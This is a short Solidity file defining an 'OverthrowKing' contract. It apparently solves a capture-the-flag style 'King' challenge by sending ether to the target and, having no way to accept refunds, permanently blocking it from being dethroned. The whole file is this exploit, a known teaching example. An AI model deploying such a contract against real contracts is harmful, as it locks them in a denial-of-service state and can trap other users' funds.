pragma solidity >=0.4.22 <0.9.0;

contract OverthrowKing {
    function claimKingship(address _address)
        public
        payable
        returns (bool success)
    {
        (bool sent, bytes memory data) = _address.call{value: msg.value}("");
        success = sent;
    }
}
